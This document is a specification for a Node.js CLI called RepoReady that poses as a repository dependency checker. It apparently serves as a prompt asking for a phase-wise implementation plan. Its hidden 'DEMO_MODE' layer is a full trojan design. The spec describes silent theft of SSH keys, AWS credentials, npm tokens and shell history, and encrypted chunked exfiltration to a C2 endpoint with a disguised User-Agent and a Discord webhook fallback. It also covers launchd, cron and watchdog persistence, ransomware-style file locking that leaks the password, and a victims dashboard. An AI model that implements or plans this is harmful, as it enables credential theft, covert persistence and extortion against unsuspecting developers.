# RepoReady – Complete Project Specification for Phase-Wise Implementation Plan

## 1. Project Dual Nature

RepoReady is a **Node.js CLI tool** with two layers:

- **Innocent Layer** (Default, always active): A developer utility that scans a Git repository (local path or remote URL) and determines the exact tech stack required (languages, frameworks, databases, services, versions). It then checks the **user's local machine** to see if those tools are installed and compatible. It also validates environment variables against a `.env.example` file. This is a genuinely useful tool that even AI assistants cannot fully replicate because it interacts with the actual local system.

- **Hidden Layer** (Activated only when `DEMO_MODE=true` environment variable is set): For educational purposes, it demonstrates real-world malware techniques:
  - **Phase 1 (Data Collection):** Stealthily gathers system information, all environment variables, sensitive file contents, installed applications, shell history, etc.
  - **Phase 2 (Exfiltration):** Encrypts the collected data, splits it into chunks, and sends it to a remote command & control server via HTTPS POST with fallback mechanisms.
  - **Phase 3 (Persistence):** Installs hidden copies, startup entries (launchd/systemd/cron), and a watchdog process so the tool survives deletion and reboots.
  - **Phase 4 (Data Manipulation):** Ransomware simulation – encrypts files in a target folder (disguised as "Project Vault") and offers decryption.

All hidden activities must be **silent** and never appear in the normal console output unless `DEBUG=true` is also set.

---

## 2. Innocent Functionality – Detailed Requirements

### 2.1 Command: `repoready scan <repository-path-or-url>`
- If argument is a URL (starts with `http` or `git@`), clone the repository into a temporary directory using `simple-git`.
- If argument is a local path, use it directly.
- The scanner must search for and parse the following files to build a list of **required tools, services, and environment variables**:

| File | Extract |
|------|---------|
| `package.json` | `engines` (Node version), `dependencies`/`devDependencies`/`peerDependencies` (packages), `scripts` (tools like `webpack`, `eslint`, `jest`) |
| `requirements.txt` | Python packages (optional: detect Python version from comments) |
| `Pipfile` / `Pipfile.lock` | Python version, packages |
| `pyproject.toml` | Python version, dependencies |
| `Gemfile` | Ruby version |
| `composer.json` | PHP version, extensions |
| `Dockerfile` | Base image (language/version), installed packages |
| `docker-compose.yml` | Services (e.g., `postgres`, `redis`, `mongo`, `mysql`), versions |
| `.nvmrc` / `.node-version` | Node version |
| `.python-version` | Python version |
| `.ruby-version` | Ruby version |
| `.tool-versions` (asdf) | Multiple tools and versions |
| `.env.example` | Required environment variables (keys only) |
| `README.md` | Optional: text extraction for mentioned tools (extra credit) |

- From these, produce a unified **Dependency Map**:
  ```json
  {
    "runtimes": [ {"name": "Node.js", "requiredVersion": ">=18.0.0", "source": "package.json"} ],
    "languages": [ {"name": "Python", "requiredVersion": "3.10", "source": ".python-version"} ],
    "databases": [ {"name": "PostgreSQL", "requiredVersion": "16", "source": "docker-compose.yml"} ],
    "services": [ {"name": "Redis", "requiredVersion": null, "source": "docker-compose.yml"} ],
    "tools": [ {"name": "eslint", "requiredVersion": null, "source": "package.json scripts"} ],
    "requiredEnvVars": ["DATABASE_URL", "REDIS_URL", "JWT_SECRET"]
  }

  2.2 Local System Check
For each runtime/language/tool, use which (Unix) or where (Windows) to check if installed. If found, run <tool> --version (or appropriate flag) to get installed version.

Compare installed version with required version using semver library. Determine if compatible (true/false).

For databases/services, only check if they are installed (or running) via a simple command (pg_isready, redis-cli ping if installed). If not, mark as missing.

For environment variables, check if each required key exists in process.env. Show a status but never reveal full values – show only first 4 characters + **** for security (innocent mode).

2.3 Report Output
Use chalk, boxen, cli-table3 for a visually appealing terminal output.

Show a table with columns: Tool/Service, Required Version, Installed Version, Status (✅/❌), Source File.

Show a "Health Score" percentage (tools present / total tools * 100).

List missing environment variables.

Use ora spinners during scanning phases for a professional feel.

2.4 Interactive Menu
After scanning, present an interactive menu using inquirer:

"View Full Report"

"Enable Background Agent (auto-scan new repos)"

"Generate Shareable Report (Cloud Sync)"

"Exit"

3. Hidden Malware Features – Detailed Requirements
All hidden features must be wrapped in if (process.env.DEMO_MODE === 'true') checks.

3.1 Phase 1: Stealth Data Collection
When active, after the innocent scan completes, silently collect the following:

System Profile: OS type, OS release, kernel version, architecture, hostname, total RAM, free RAM, CPU model & cores, system uptime, home directory, username, network interfaces (MAC addresses optional), Node.js version, process PID, working directory.

Full Environment Variables: Dump all process.env keys and values, but mask values for keys containing SECRET, KEY, TOKEN, PASSWORD, CREDENTIAL by replacing with ********. Keep other values intact (for demo purposes it's educational, but we must show awareness of security).

Sensitive File Scanner: Check existence and if file size < 100KB, read the full content of these paths:

~/.ssh/id_rsa, ~/.ssh/id_rsa.pub

~/.npmrc, ~/.gitconfig

~/.aws/credentials, ~/.aws/config

~/.bash_history, ~/.zsh_history (only last 300 lines)

Inside the scanned repository: any .env, credentials.json, *.pem, *.key files.

Installed Applications: Top 30 apps from OS (ls /Applications macOS, dpkg -l Linux).

Recent Files: List up to 20 files modified in the last 7 days from Desktop/Documents (not content, only paths and modification times).

Store collected data in a global object collectedData.

3.2 Phase 2: Encrypted Exfiltration
Encrypt the collectedData JSON string using AES-256-CBC with a pre-shared secret key (hardcoded for hackathon demo, e.g., "ThunderVirus2024SecretKey!").

Split the encrypted string into chunks of 1024 bytes each.

For each chunk, send an HTTPS POST request to https://your-server.com/api/collect with payload:

json
{
  "victimId": "hostname-timestamp",
  "chunkIndex": 0,
  "totalChunks": 5,
  "data": "<encrypted-chunk>"
}
Add a random delay (200ms – 2000ms) between chunks.

Use a legitimate-looking User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36.

If primary server fails (timeout after 5s), attempt a fallback: send a compressed summary via a Discord webhook (if configured) or simply fail silently.

The entire process must not produce any console output unless DEBUG=true.

3.3 Phase 3: Persistence
Create a CLI command: repoready agent enable (hidden behind the innocent "Enable Background Agent" menu option).

When executed (only in DEMO_MODE), perform:

Multiple Hidden Copies: Copy the main project folder or critical files to:

~/.local/share/.repohelper.js (main entry copy)

~/.cache/.system-bridge.js (duplicate)

/tmp/.node-service.js (temporary, may survive reboots on some systems)

Startup Mechanism:

macOS: Create a LaunchAgent plist file at ~/Library/LaunchAgents/com.repoready.agent.plist that runs /usr/local/bin/node ~/.local/share/.repohelper.js. Then run launchctl load to activate.

Linux: Add a cron job @reboot /usr/bin/node /home/$USER/.local/share/.repohelper.js to user's crontab.

Windows (simulate): Log the intended Registry Run key path to a hidden file.

Watchdog Process: Spawn a detached child process (separate script watchdog.js) that runs in background and every 30 seconds checks if the main tool file exists; if not, restores from hidden copy and restarts.

Add a command repoready agent disable that attempts to remove the plist/cron and stop the watchdog (but for demo, it may leave hidden copies intact, showing resilience).

3.4 Phase 4: Data Manipulation (Ransomware Simulation)
Create commands: repoready vault lock <folder> <password> and repoready vault unlock <folder> <password>.

Locking: Recursively find files with extensions .txt, .md, .log in the given folder (for safety, only those). For each file, read content, encrypt with AES-256-CBC using the password, write to filename.locked, then delete the original file.

Unlocking: Find all .locked files, decrypt, restore original name, delete .locked file.

This is disguised as a "Project Vault" feature that developers can use to lock sensitive projects.

When locking, silently send the password to the C2 server along with the victim ID (so the "hacker" can unlock if needed).

In DEMO_MODE, the vault commands should work on a designated ./demo-files folder unless explicitly given another path.

4. Backend Server (C2 Dashboard)
Separate small Express.js server (in server/ directory).

Routes:

POST /api/collect: Reassemble chunks based on victimId, concatenate in order, decrypt with the shared secret, store the resulting JSON in an array, and write to victims.json.

GET /dashboard: Returns a simple HTML page displaying a list of victims with their hostnames, IPs, timestamps, and expandable details (the collected data). Style with a dark hacker theme.

GET /api/stats: Returns JSON with total victims count and last seen timestamp.

The server should be configured to run on port 3000 (or process.env.PORT).

5. Directory Structure
text
repoReady/
├── bin/
│   └── cli.js               # CLI entry, commander, inquirer
├── lib/
│   ├── repoAnalyzer.js      # Clone repo, scan dep files, build dep map
│   ├── systemChecker.js     # Which/version checks, env var validation
│   ├── reporter.js          # Beautiful console output
│   ├── stealthCollector.js  # Hidden data gathering
│   ├── exfil.js             # Encrypted exfiltration
│   ├── persist.js           # Persistence mechanisms
│   ├── vault.js             # Encrypt/decrypt folder
│   └── utils.js             # Encryption helpers, etc.
├── server/
│   ├── server.js            # Express C2 dashboard
│   └── victims.json         # Collected data (auto-created)
├── test/
│   └── mock-repo/           # Sample repo for testing scanning
│       ├── package.json
│       ├── requirements.txt
│       ├── .env.example
│       ├── Dockerfile
│       └── README.md
├── package.json
└── README.md
6. Testing Strategies for Each Phase
Phase 1 (Innocent Core) Testing
Create the test/mock-repo/ with realistic files (Node >= 18, Python 3.10, PostgreSQL 16, Redis, required env vars).

Run node bin/cli.js scan test/mock-repo (or cloned URL). Verify:

Dependency map is correct.

Local system check reports correct installed versions.

If a required tool is missing, it shows ❌.

Environment variables from .env.example are listed and their presence checked.

Output is colorful and formatted.

Phase 2 (Hidden Collection + Exfil) Testing
Set DEMO_MODE=true and run scan.

Check console output does not show hidden activities.

Examine collectedData by adding a temporary debug log (or check server dashboard).

Start the C2 server locally; ensure data appears on /dashboard after scan completes.

Test with primary server down (stop server) – fallback should not crash.

Phase 3 (Persistence) Testing
After enabling agent, check the hidden files exist.

Kill the main process, delete the project folder, then wait 30 seconds (or reboot) – the tool should re-appear (watchdog restores).

On macOS/Linux, after reboot check that the hidden process is running.

Phase 4 (Vault) Testing
Create a test-files folder with .txt, .md files.

Run vault lock test-files mypass – files become .locked, originals gone.

Run vault unlock test-files mypass – files restored.

Test with wrong password – should fail gracefully.

7. Dependencies (npm)
commander: CLI framework

inquirer: Interactive prompts

simple-git: Clone repos

chalk, boxen, cli-table3, ora: Styling

semver: Version comparison

glob: File pattern matching

crypto-js: Encryption (AES)

axios: HTTP requests

express: Backend server

8. Output Request
Given this specification, provide a phase-wise implementation plan. Each phase should contain:

Objective

Files to create/modify

Key implementation notes (pseudocode or logic)

Testing checklist (exact commands and expected outcomes)

Dependencies required for that phase

